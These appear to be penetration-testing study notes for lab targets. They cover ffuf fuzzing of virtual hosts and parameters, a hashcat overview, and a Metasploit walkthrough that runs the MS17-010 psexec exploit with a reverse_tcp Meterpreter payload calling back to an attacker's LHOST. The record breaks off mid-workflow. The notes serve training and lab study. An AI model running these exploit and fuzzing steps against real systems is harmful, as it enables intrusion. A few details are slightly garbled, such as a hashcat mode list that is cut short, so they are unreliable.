+<li><code>-fw</code>: Filter by amount of words in response. Comma separated list of word counts and ranges</li>
+</ul>
+<p>In this case, we cannot use matching, as we don’t know what the response size from other VHosts would be. We know the response size of the incorrect results, which, as seen from the test above, is 900, and we can filter it out with <code>-fs 900</code>.</p>
+<h3 id="vhost-fuzzing-with-filtering"><a class="header" href="#vhost-fuzzing-with-filtering">VHost Fuzzing with Filtering</a></h3>
+<pre><code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
+</code></pre>
+<ul>
+<li>Uses the <code>Host</code> header to specify different virtual hosts</li>
+<li><code>-fs</code> filters out responses matching the default/known host size</li>
+<li>Critical when IP-based enumeration doesn’t reveal all content</li>
+<li>Often discovers internal or development sites</li>
+</ul>
+<p><strong>Note:</strong> Don’t forget to add discovered VHosts to <code>/etc/hosts</code> if they don’t have public DNS records.</p>
+<hr>
+<h2 id="parameter-fuzzing---get-1"><a class="header" href="#parameter-fuzzing---get-1">Parameter Fuzzing - GET</a></h2>
+<p>If we run a recursive ffuf scan on admin.academy.htb, we should find <code>http://admin.academy.htb:PORT/admin/admin.php</code>. If we try accessing this page, we see a message indicating that there must be something that identifies users to verify whether they have access to read the flag. We did not login, nor do we have any cookie that can be verified at the backend. So, perhaps there is a key that we can pass to the page to read the flag. Such keys would usually be passed as a parameter, using either a GET or a POST HTTP request.</p>
+<p><strong>Tip:</strong> Fuzzing parameters may expose unpublished parameters that are publicly accessible. Such parameters tend to be less tested and less secured, so it is important to test such parameters for the web vulnerabilities we discuss in other modules.</p>
+<h3 id="get-request-fuzzing"><a class="header" href="#get-request-fuzzing">GET Request Fuzzing</a></h3>
+<p>Similarly to how we have been fuzzing various parts of a website, we will use ffuf to enumerate parameters. Let us first start with fuzzing for GET requests, which are usually passed right after the URL, with a <code>?</code> symbol, like:</p>
+<p><code>http://admin.academy.htb:PORT/admin/admin.php?param1=key</code></p>
+<p>So, all we have to do is replace <code>param1</code> in the example above with <code>FUZZ</code> and rerun our scan. Before we can start, however, we must pick an appropriate wordlist. Once again, SecLists has just that in <code>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt</code>. With that, we can run our scan.</p>
+<p>Once again, we will get many results back, so we will filter out the default response size we are getting.</p>
+<h3 id="get-parameter-fuzzing-example"><a class="header" href="#get-parameter-fuzzing-example">GET Parameter Fuzzing Example</a></h3>
+<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
+</code></pre>
+<ul>
+<li>Fuzzes parameter names in GET requests</li>
+<li>Useful for finding hidden functionality, API endpoints, or vulnerable parameters</li>
+<li>Filter by response size to exclude default error pages</li>
+</ul>
+<hr>
+<h2 id="parameter-fuzzing---post-1"><a class="header" href="#parameter-fuzzing---post-1">Parameter Fuzzing - POST</a></h2>
+<p>The main difference between POST requests and GET requests is that POST requests are not passed with the URL and cannot simply be appended after a <code>?</code> symbol. POST requests are passed in the data field within the HTTP request.</p>
+<p>To fuzz the data field with ffuf, we can use the <code>-d</code> flag, as we saw previously in the output of <code>ffuf -h</code>. We also have to add <code>-X POST</code> to send POST requests.</p>
+<p><strong>Tip:</strong> In PHP, “POST” data “content-type” can only accept “application/x-www-form-urlencoded”. So, we can set that in “ffuf” with <code>-H 'Content-Type: application/x-www-form-urlencoded'</code>.</p>
+<p>So, let us repeat what we did earlier, but place our <code>FUZZ</code> keyword after the <code>-d</code> flag:</p>
+<h3 id="post-parameter-fuzzing-example"><a class="header" href="#post-parameter-fuzzing-example">POST Parameter Fuzzing Example</a></h3>
+<pre><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
+</code></pre>
+<ul>
+<li><code>-X POST</code>: Specifies POST method</li>
+<li><code>-d</code>: Sets POST data with <code>FUZZ</code> placeholder</li>
+<li><code>-H</code>: Sets required headers (Content-Type is often needed)</li>
+<li>POST parameters often handle authentication, file uploads, or sensitive operations</li>
+</ul>
+<h3 id="testing-post-requests-manually"><a class="header" href="#testing-post-requests-manually">Testing POST Requests Manually</a></h3>
+<p>We can test POST requests with curl to verify they work before fuzzing:</p>
+<pre><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
+</code></pre>
+<hr>
+<h2 id="value-fuzzing-1"><a class="header" href="#value-fuzzing-1">Value Fuzzing</a></h2>
+<p>After fuzzing a working parameter, we now have to fuzz the correct value that would return the flag content we need. This section will discuss fuzzing for parameter values, which should be fairly similar to fuzzing for parameters, once we develop our wordlist.</p>
+<h3 id="custom-wordlist"><a class="header" href="#custom-wordlist">Custom Wordlist</a></h3>
+<p>When it comes to fuzzing parameter values, we may not always find a pre-made wordlist that would work for us, as each parameter would expect a certain type of value.</p>
+<p>For some parameters, like usernames, we can find a pre-made wordlist for potential usernames, or we may create our own based on users that may potentially be using the website. For such cases, we can look for various wordlists under the seclists directory and try to find one that may contain values matching the parameter we are targeting. In other cases, like custom parameters, we may have to develop our own wordlist.</p>
+<p>In this case, we can guess that the <code>id</code> parameter can accept a number input of some sort. These ids can be in a custom format, or can be sequential, like from 1-1000 or 1-1000000, and so on. We’ll start with a wordlist containing all numbers from 1-1000.</p>
+<p>There are many ways to create this wordlist, from manually typing the IDs in a file, or scripting it using Bash or Python. The simplest way is to use the following command in Bash that writes all numbers from 1-1000 to a file:</p>
+<h3 id="creating-sequential-wordlists"><a class="header" href="#creating-sequential-wordlists">Creating Sequential Wordlists</a></h3>
+<pre><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done
+</code></pre>
+<h3 id="value-fuzzing-example"><a class="header" href="#value-fuzzing-example">Value Fuzzing Example</a></h3>
+<p>Our command should be fairly similar to the POST command we used to fuzz for parameters, but our <code>FUZZ</code> keyword should be put where the parameter value would be, and we will use the <code>ids.txt</code> wordlist we just created:</p>
+<pre><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
+</code></pre>
+<ul>
+<li>Fuzzes parameter values instead of names</li>
+<li>Useful for finding valid IDs, usernames, or other identifiers</li>
+<li>Can reveal authorization flaws or information disclosure</li>
+<li>Often requires creating custom wordlists based on the parameter type</li>
+</ul>
+<hr>
+<h2 id="key-options-summary"><a class="header" href="#key-options-summary">Key Options Summary</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-w</code></td><td>Wordlist file path and (optional) keyword separated by colon. eg. ‘/path/to/wordlist:KEYWORD’</td></tr>
+<tr><td><code>-u</code></td><td>Target URL</td></tr>
+<tr><td><code>-H</code></td><td>Header <code>"Name: Value"</code>, separated by colon. Multiple -H flags are accepted</td></tr>
+<tr><td><code>-X</code></td><td>HTTP method to use (default: GET)</td></tr>
+<tr><td><code>-b</code></td><td>Cookie data <code>"NAME1=VALUE1; NAME2=VALUE2"</code> for copy as curl functionality</td></tr>
+<tr><td><code>-d</code></td><td>POST data</td></tr>
+<tr><td><code>-recursion</code></td><td>Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)</td></tr>
+<tr><td><code>-recursion-depth</code></td><td>Maximum recursion depth. (default: 0)</td></tr>
+<tr><td><code>-e</code></td><td>File extensions to append</td></tr>
+<tr><td><code>-v</code></td><td>Verbose output</td></tr>
+<tr><td><code>-t</code></td><td>Number of concurrent threads (default: 40)</td></tr>
+<tr><td><code>-mc</code></td><td>Match HTTP status codes, or “all” for everything. (default: 200,204,301,302,307,401,403)</td></tr>
+<tr><td><code>-ms</code></td><td>Match HTTP response size</td></tr>
+<tr><td><code>-fc</code></td><td>Filter HTTP status codes from response. Comma separated list of codes and ranges</td></tr>
+<tr><td><code>-fs</code></td><td>Filter HTTP response size. Comma separated list of sizes and ranges</td></tr>
+<tr><td><code>-fl</code></td><td>Filter by amount of lines in response</td></tr>
+<tr><td><code>-fw</code></td><td>Filter by amount of words in response</td></tr>
+<tr><td><code>-ic</code></td><td>Ignore comments in wordlist</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="core-takeaways-3"><a class="header" href="#core-takeaways-3">Core Takeaways</a></h2>
+<ul>
+<li>FFuf is fast and efficient for web content discovery, testing almost 90k URLs in less than 10 seconds</li>
+<li>The <code>FUZZ</code> keyword is the core mechanism for replacing values from wordlists</li>
+<li>Filtering responses is essential for reducing noise, especially when many results return 200 OK</li>
+<li>Different fuzzing types target different attack surfaces (directories, parameters, values)</li>
+<li>VHost fuzzing is critical when multiple sites share an IP and don’t have public DNS records</li>
+<li>POST parameter fuzzing often reveals more sensitive functionality than GET</li>
+<li>Recursive fuzzing automates discovery but should be limited by depth to prevent excessive scanning</li>
+<li>Custom wordlists are often needed for value fuzzing based on the parameter type</li>
+<li>Always verify discovered endpoints manually before proceeding with further enumeration</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="hashcat"><a class="header" href="#hashcat">Hashcat</a></h1>
+<p>Password cracking can be an effective way of gaining access to systems when passwords are weak or poorly managed. Hashcat is a powerful and versatile password cracking tool that supports a wide range of hashing algorithms and attack modes.</p>
+<p>The success of a password cracking attempt largely depends on the quality of the wordlists and the complexity of the passwords being targeted.</p>
+<h2 id="hashing-2"><a class="header" href="#hashing-2">Hashing</a></h2>
+<p>Hashing is the process of converting a password into a fixed-length string of characters. Hashes are designed to be irreversible, meaning that it should be computationally infeasible to retrieve the original password from its hash. Common hashing algorithms include MD5, SHA-1, SHA-256, and bcrypt. Typically, a hash function always returns values of the same length regardless of the input size, complexity, etc.</p>
+<p>When passwords are stored in databases, they are often hashed to protect them from being easily read if the database is compromised. However, if an attacker can obtain the hash values, they can attempt to crack them using tools like Hashcat. Hashcat can read values from a wordlist, hash them, and compare them to the target hash values to find matches.</p>
+<h2 id="hash-algorithms"><a class="header" href="#hash-algorithms">Hash Algorithms</a></h2>
+<h4 id="sha-512"><a class="header" href="#sha-512">SHA-512</a></h4>
+<p>SHA-512 (Secure Hash Algorithm 512-bit) is a member of the SHA-2 family of cryptographic hash functions. It produces a 512-bit (64-byte) hash value, typically represented as a 128-character hexadecimal string. SHA-512 is widely used for data integrity verification and digital signatures due to its strong security properties.</p>
+<h4 id="blowfish"><a class="header" href="#blowfish">Blowfish</a></h4>
+<p>Blowfish is a symmetric-key block cipher designed by Bruce Schneier in 1993. It operates on 64-bit blocks and supports key sizes ranging from 32 bits to 448 bits Blowfish is known for its speed and effectiveness, making it a popular choice for encrypting data in various applications.</p>
+<h4 id="bcrypt"><a class="header" href="#bcrypt">Bcrypt</a></h4>
+<p>Bcrypt is a password hashing function designed to be computationally intensive to resist brute-force attacks. It incorporates a salt to protect against rainbow table attacks and allows for adjustable work factors, making it adaptable to increasing computational power over time. Bcrypt is widely used for securely storing passwords in databases.</p>
+<h4 id="md5"><a class="header" href="#md5">MD5</a></h4>
+<p>MD5 (Message-Digest Algorithm 5) is a widely used cryptographic hash function that produces a 128-bit (16-byte) hash value, typically represented as a 32-character hexadecimal string. Although it was once considered secure, MD5 is now vulnerable to collision attacks and is not recommended for security-sensitive applications.</p>
+<h4 id="argon2"><a class="header" href="#argon2">Argon2</a></h4>
+<p>Argon2 is a modern password hashing algorithm that won the Password Hashing Competition in 2015. It is designed to be resistant to GPU and ASIC attacks by being memory-intensive and computationally expensive. Argon2 has three variants: Argon2d, Argon2i, and Argon2id, each optimized for different security needs.</p>
+<h2 id="using-hashcat"><a class="header" href="#using-hashcat">Using Hashcat</a></h2>
+<p>Hashcat has 6 primary attack modes:</p>
+<ol>
+<li>Straight: Uses a wordlist to try and match hashes.</li>
+<li>Combination: Combines words from two wordlists to create new password candidates.</li>
+<li>Brute-force: Tries all possible combinations of characters up to a specified length.</li>
+<li>Hybrid Wordlist + Mask: Appends or prepends characters to words from a word</li>
+<li>Hybrid Mask + Wordlist: Prepends or appends words from a wordlist to a mask.</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="metasploit-framework"><a class="header" href="#metasploit-framework">Metasploit Framework</a></h1>
+<p>Metasploit is a penetration testing framework that provides a collection of tools for developing and executing exploit code against remote targets. The framework consists of prepared scripts with specific purposes and corresponding functions that have been developed and tested in the wild.</p>
+<h2 id="important-note-on-exploit-failures"><a class="header" href="#important-note-on-exploit-failures">Important Note on Exploit Failures</a></h2>
+<p>Many people often think that the failure of an exploit disproves the existence of the suspected vulnerability. However, this is only proof that the Metasploit exploit does not work and <strong>not</strong> that the vulnerability does not exist. This is because many exploits require customization according to the target hosts to make the exploit work. Therefore, automated tools such as the Metasploit framework should only be considered a support tool and not a substitute for manual skills.</p>
+<hr>
+<h2 id="module-structure-1"><a class="header" href="#module-structure-1">Module Structure</a></h2>
+<p>Each Metasploit module follows a structured naming convention:</p>
+<pre><code>&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;
+</code></pre>
+<h3 id="example-6"><a class="header" href="#example-6">Example</a></h3>
+<pre><code>794   exploit/windows/ftp/scriptftp_list
+</code></pre>
+<h3 id="components-explained"><a class="header" href="#components-explained">Components Explained</a></h3>
+<ol>
+<li><strong>Index No. (No.)</strong>: Displayed during searches to select specific modules later</li>
+<li><strong>Type</strong>: First level of segregation between modules (see Module Types below)</li>
+<li><strong>OS</strong>: Operating system and architecture the module targets</li>
+<li><strong>Service</strong>: Vulnerable service running on target (or general activity for auxiliary/post modules)</li>
+<li><strong>Name</strong>: Actual action that can be performed using the module</li>
+</ol>
+<hr>
+<h2 id="module-types-1"><a class="header" href="#module-types-1">Module Types</a></h2>
+<h3 id="interactable-modules-can-use-use-no"><a class="header" href="#interactable-modules-can-use-use-no">Interactable Modules (Can use <code>use &lt;no.&gt;</code>)</a></h3>
+<p>These modules can be directly used with the <code>use</code> command:</p>
+<h4 id="auxiliary"><a class="header" href="#auxiliary">Auxiliary</a></h4>
+<ul>
+<li><strong>Purpose</strong>: Scanning, fuzzing, sniffing, and admin capabilities</li>
+<li><strong>Description</strong>: Offer extra assistance and functionality</li>
+<li><strong>Example</strong>: <code>auxiliary/scanner/smb/smb_ms17_010</code> - SMB vulnerability scanner</li>
+</ul>
+<h4 id="exploits"><a class="header" href="#exploits">Exploits</a></h4>
+<ul>
+<li><strong>Purpose</strong>: Exploit vulnerabilities to allow payload delivery</li>
+<li><strong>Description</strong>: Defined as modules that exploit a vulnerability</li>
+<li><strong>Example</strong>: <code>exploit/windows/smb/ms17_010_psexec</code> - MS17-010 EternalRomance exploit</li>
+</ul>
+<h4 id="post"><a class="header" href="#post">Post</a></h4>
+<ul>
+<li><strong>Purpose</strong>: Information gathering, pivoting deeper into networks</li>
+<li><strong>Description</strong>: Wide array of modules for post-exploitation activities</li>
+<li><strong>Example</strong>: <code>post/windows/gather/credentials</code> - Gather Windows credentials</li>
+</ul>
+<h3 id="non-interactable-modules-support-modules"><a class="header" href="#non-interactable-modules-support-modules">Non-Interactable Modules (Support modules)</a></h3>
+<p>These modules support the interactable ones but cannot be directly used:</p>
+<h4 id="encoders"><a class="header" href="#encoders">Encoders</a></h4>
+<ul>
+<li><strong>Purpose</strong>: Ensure payloads are intact to their destination</li>
+<li><strong>Description</strong>: Encode payloads to evade detection and filters</li>
+</ul>
+<h4 id="nops-no-operation-code"><a class="header" href="#nops-no-operation-code">NOPs (No Operation code)</a></h4>
+<ul>
+<li><strong>Purpose</strong>: Keep payload sizes consistent across exploit attempts</li>
+<li><strong>Description</strong>: Used to maintain consistent buffer sizes</li>
+</ul>
+<h4 id="payloads"><a class="header" href="#payloads">Payloads</a></h4>
+<ul>
+<li><strong>Purpose</strong>: Code that runs remotely and calls back to attacker machine</li>
+<li><strong>Description</strong>: Establishes connection (or shell) back to attacker</li>
+<li><strong>Example</strong>: <code>windows/meterpreter/reverse_tcp</code> - Reverse TCP Meterpreter payload</li>
+</ul>
+<h4 id="plugins"><a class="header" href="#plugins">Plugins</a></h4>
+<ul>
+<li><strong>Purpose</strong>: Additional scripts integrated within msfconsole</li>
+<li><strong>Description</strong>: Extend functionality and coexist with other modules</li>
+</ul>
+<hr>
+<h2 id="searching-for-modules"><a class="header" href="#searching-for-modules">Searching for Modules</a></h2>
+<p>Metasploit offers a well-developed search function to quickly find suitable modules for targets.</p>
+<h3 id="basic-search-syntax"><a class="header" href="#basic-search-syntax">Basic Search Syntax</a></h3>
+<pre><code class="language-bash">search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]
+</code></pre>
+<h3 id="search-options-1"><a class="header" href="#search-options-1">Search Options</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-h</code></td><td>Show help information</td></tr>
+<tr><td><code>-o &lt;file&gt;</code></td><td>Send output to a file in CSV format</td></tr>
+<tr><td><code>-S &lt;string&gt;</code></td><td>Regex pattern used to filter search results</td></tr>
+<tr><td><code>-u</code></td><td>Use module if there is one result</td></tr>
+<tr><td><code>-s &lt;search_column&gt;</code></td><td>Sort results based on column in ascending order</td></tr>
+<tr><td><code>-r</code></td><td>Reverse the search results order to descending order</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="search-keywords-1"><a class="header" href="#search-keywords-1">Search Keywords</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Keyword</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>aka</code></td><td>Modules with matching AKA (also-known-as) name</td></tr>
+<tr><td><code>author</code></td><td>Modules written by this author</td></tr>
+<tr><td><code>arch</code></td><td>Modules affecting this architecture</td></tr>
+<tr><td><code>bid</code></td><td>Modules with matching Bugtraq ID</td></tr>
+<tr><td><code>cve</code></td><td>Modules with matching CVE ID</td></tr>
+<tr><td><code>edb</code></td><td>Modules with matching Exploit-DB ID</td></tr>
+<tr><td><code>check</code></td><td>Modules that support the ‘check’ method</td></tr>
+<tr><td><code>date</code></td><td>Modules with matching disclosure date</td></tr>
+<tr><td><code>description</code></td><td>Modules with matching description</td></tr>
+<tr><td><code>fullname</code></td><td>Modules with matching full name</td></tr>
+<tr><td><code>mod_time</code></td><td>Modules with matching modification date</td></tr>
+<tr><td><code>name</code></td><td>Modules with matching descriptive name</td></tr>
+<tr><td><code>path</code></td><td>Modules with matching path</td></tr>
+<tr><td><code>platform</code></td><td>Modules affecting this platform</td></tr>
+<tr><td><code>port</code></td><td>Modules with matching port</td></tr>
+<tr><td><code>rank</code></td><td>Modules with matching rank (descriptive like ‘good’ or numeric with operators like ‘gte400’)</td></tr>
+<tr><td><code>ref</code></td><td>Modules with matching ref</td></tr>
+<tr><td><code>reference</code></td><td>Modules with matching reference</td></tr>
+<tr><td><code>target</code></td><td>Modules affecting this target</td></tr>
+<tr><td><code>type</code></td><td>Modules of specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="supported-search-columns-for-sorting"><a class="header" href="#supported-search-columns-for-sorting">Supported Search Columns (for sorting)</a></h3>
+<ul>
+<li><code>rank</code> - Sort by exploitability rank</li>
+<li><code>date</code> / <code>disclosure_date</code> - Sort by disclosure date</li>
+<li><code>name</code> - Sort by module name</li>
+<li><code>type</code> - Sort by module type</li>
+<li><code>check</code> - Sort by whether they have a check method</li>
+</ul>
+<h3 id="search-examples"><a class="header" href="#search-examples">Search Examples</a></h3>
+<h4 id="simple-search"><a class="header" href="#simple-search">Simple Search</a></h4>
+<pre><code class="language-bash">msf6 &gt; search eternalromance
+</code></pre>
+<h4 id="filtered-search"><a class="header" href="#filtered-search">Filtered Search</a></h4>
+<pre><code class="language-bash">msf6 &gt; search eternalromance type:exploit
+</code></pre>
+<h4 id="complex-search"><a class="header" href="#complex-search">Complex Search</a></h4>
+<pre><code class="language-bash">msf6 &gt; search type:exploit platform:windows cve:2021 rank:excellent microsoft
+</code></pre>
+<p>This searches for:</p>
+<ul>
+<li>Exploit modules</li>
+<li>Targeting Windows platform</li>
+<li>Related to CVEs from 2021</li>
+<li>With excellent rank</li>
+<li>Containing “microsoft” in the name/description</li>
+</ul>
+<h4 id="excluding-results"><a class="header" href="#excluding-results">Excluding Results</a></h4>
+<p>Prepend a value with <code>-</code> to exclude matching results:</p>
+<pre><code class="language-bash">msf6 &gt; search cve:2009 type:exploit platform:-linux
+</code></pre>
+<hr>
+<h2 id="module-selection-and-usage"><a class="header" href="#module-selection-and-usage">Module Selection and Usage</a></h2>
+<h3 id="step-1-finding-a-module"><a class="header" href="#step-1-finding-a-module">Step 1: Finding a Module</a></h3>
+<p>First, identify your target and search for appropriate modules. For example, if you’ve identified SMB port 445 open on a Windows target:</p>
+<pre><code class="language-bash">msf6 &gt; search ms17_010
+</code></pre>
+<p>Output:</p>
+<pre><code>Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+</code></pre>
+<h3 id="step-2-selecting-a-module"><a class="header" href="#step-2-selecting-a-module">Step 2: Selecting a Module</a></h3>
+<p>Use the module number or full path:</p>
+<pre><code class="language-bash">msf6 &gt; use 1
+# OR
+msf6 &gt; use exploit/windows/smb/ms17_010_psexec
+</code></pre>
+<p>The prompt changes to indicate the active module:</p>
+<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt;
+</code></pre>
+<h3 id="step-3-viewing-module-options"><a class="header" href="#step-3-viewing-module-options">Step 3: Viewing Module Options</a></h3>
+<p>Check what options need to be configured:</p>
+<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
+</code></pre>
+<p>Output shows:</p>
+<ul>
+<li><strong>Required</strong> options (must be set)</li>
+<li><strong>Optional</strong> options (can be customized)</li>
+<li>Current settings</li>
+<li>Descriptions for each option</li>
+</ul>
+<h3 id="step-4-configuring-options"><a class="header" href="#step-4-configuring-options">Step 4: Configuring Options</a></h3>
+<p>Set required options for your target:</p>
+<pre><code class="language-bash"># Set target host
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40
+
+# Set global options (persist across modules)
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg LHOST 10.10.14.15
+
+# Set local options (only for current module)
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 4444
+</code></pre>
+<h3 id="step-5-checking-vulnerability-optional"><a class="header" href="#step-5-checking-vulnerability-optional">Step 5: Checking Vulnerability (Optional)</a></h3>
+<p>If the module supports it, check if target is vulnerable before exploiting:</p>
+<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; check
+</code></pre>
+<h3 id="step-6-viewing-payloads"><a class="header" href="#step-6-viewing-payloads">Step 6: Viewing Payloads</a></h3>
+<p>See available payloads for the selected exploit:</p>
+<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show payloads
+</code></pre>
+<h3 id="step-7-setting-payload-optional"><a class="header" href="#step-7-setting-payload-optional">Step 7: Setting Payload (Optional)</a></h3>
+<p>If you want a specific payload instead of the default:</p>
+<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; set payload windows/meterpreter/reverse_tcp
+</code></pre>
+<p>Then configure payload-specific options:</p>
+<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
+</code></pre>
+<h3 id="step-8-executing-the-exploit"><a class="header" href="#step-8-executing-the-exploit">Step 8: Executing the Exploit</a></h3>
+<p>Run the exploit:</p>
+<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
+# OR
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit
+</code></pre>
+<hr>
+<h2 id="common-module-options"><a class="header" href="#common-module-options">Common Module Options</a></h2>
+<h3 id="target-options-1"><a class="header" href="#target-options-1">Target Options</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>RHOSTS</code></td><td>Target host(s) - can be single IP, CIDR, or file</td><td><code>set RHOSTS 10.10.10.40</code></td></tr>
+<tr><td><code>RHOST</code></td><td>Single target host</td><td><code>set RHOST 10.10.10.40</code></td></tr>
+<tr><td><code>RPORT</code></td><td>Target port (TCP)</td><td><code>set RPORT 445</code></td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="payload-options"><a class="header" href="#payload-options">Payload Options</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>LHOST</code></td><td>Attacker’s IP address (for reverse shells)</td><td><code>setg LHOST 10.10.14.15</code></td></tr>
+<tr><td><code>LPORT</code></td><td>Attacker’s listening port</td><td><code>set LPORT 4444</code></td></tr>
+<tr><td><code>PAYLOAD</code></td><td>Payload to use</td><td><code>set payload windows/meterpreter/reverse_tcp</code></td></tr>
+<tr><td><code>TARGET</code></td><td>Target OS/architecture</td><td><code>set TARGET 0</code></td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="other-common-options"><a class="header" href="#other-common-options">Other Common Options</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>SMBUser</code></td><td>Username for SMB authentication</td></tr>
+<tr><td><code>SMBPass</code></td><td>Password for SMB authentication</td></tr>
+<tr><td><code>SMBDomain</code></td><td>Windows domain for authentication</td></tr>
+<tr><td><code>SHARE</code></td><td>SMB share name (e.g., ADMIN$, C$)</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="useful-commands-1"><a class="header" href="#useful-commands-1">Useful Commands</a></h2>
+<h3 id="help-commands"><a class="header" href="#help-commands">Help Commands</a></h3>
+<pre><code class="language-bash">help                    # General help menu
+help search             # Search command help
+help &lt;command&gt;          # Help for specific command
+</code></pre>
+<h3 id="information-commands"><a class="header" href="#information-commands">Information Commands</a></h3>
+<pre><code class="language-bash">info &lt;module&gt;           # Detailed module information
+show options            # Show module options
+show payloads           # Show available payloads
+show targets            # Show available targets
+show advanced           # Show advanced options
+</code></pre>
+<h3 id="configuration-commands"><a class="header" href="#configuration-commands">Configuration Commands</a></h3>
+<pre><code class="language-bash">set &lt;option&gt; &lt;value&gt;    # Set option for current module
+setg &lt;option&gt; &lt;value&gt;   # Set global option (persists)
+unset &lt;option&gt;          # Unset option
+unsetg &lt;option&gt;         # Unset global option
+</code></pre>
+<h3 id="session-management"><a class="header" href="#session-management">Session Management</a></h3>
+<pre><code class="language-bash">sessions                # List active sessions
+sessions -i &lt;id&gt;        # Interact with session
+sessions -k &lt;id&gt;        # Kill session
+background              # Background current session
+</code></pre>
+<h3 id="module-commands"><a class="header" href="#module-commands">Module Commands</a></h3>
+<pre><code class="language-bash">use &lt;module&gt;            # Select module
+back                    # Go back to previous context
+check                   # Check if target is vulnerable
+run / exploit           # Execute exploit
+</code></pre>
+<hr>
+<h2 id="exploit-rank-levels"><a class="header" href="#exploit-rank-levels">Exploit Rank Levels</a></h2>
+<p>Metasploit ranks exploits based on reliability:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Rank</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>excellent</strong></td><td>Exploit will never crash the service</td></tr>
+<tr><td><strong>great</strong></td><td>Exploit has a default target and auto-detects the target</td></tr>
+<tr><td><strong>good</strong></td><td>Exploit has a default target</td></tr>
+<tr><td><strong>normal</strong></td><td>Exploit is otherwise reliable</td></tr>
+<tr><td><strong>average</strong></td><td>Exploit is generally unreliable</td></tr>
+<tr><td><strong>low</strong></td><td>Exploit is nearly impossible to exploit</td></tr>
+<tr><td><strong>manual</strong></td><td>Exploit is unstable or difficult to exploit</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="complete-example-workflow"><a class="header" href="#complete-example-workflow">Complete Example Workflow</a></h2>
+<h3 id="scenario"><a class="header" href="#scenario">Scenario</a></h3>
+<p>Target: Windows 7 machine with SMB port 445 open, potentially vulnerable to MS17-010</p>
+<h3 id="step-by-step-execution"><a class="header" href="#step-by-step-execution">Step-by-Step Execution</a></h3>
+<pre><code class="language-bash"># 1. Start msfconsole
+msfconsole
+
+# 2. Search for relevant exploit
+msf6 &gt; search ms17_010
+
+# 3. Select the exploit module
+msf6 &gt; use exploit/windows/smb/ms17_010_psexec
+
+# 4. View module options
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
+
+# 5. Set target
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40
+
+# 6. Set attacker IP (global, persists)
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg LHOST 10.10.14.15
+
+# 7. Set listening port
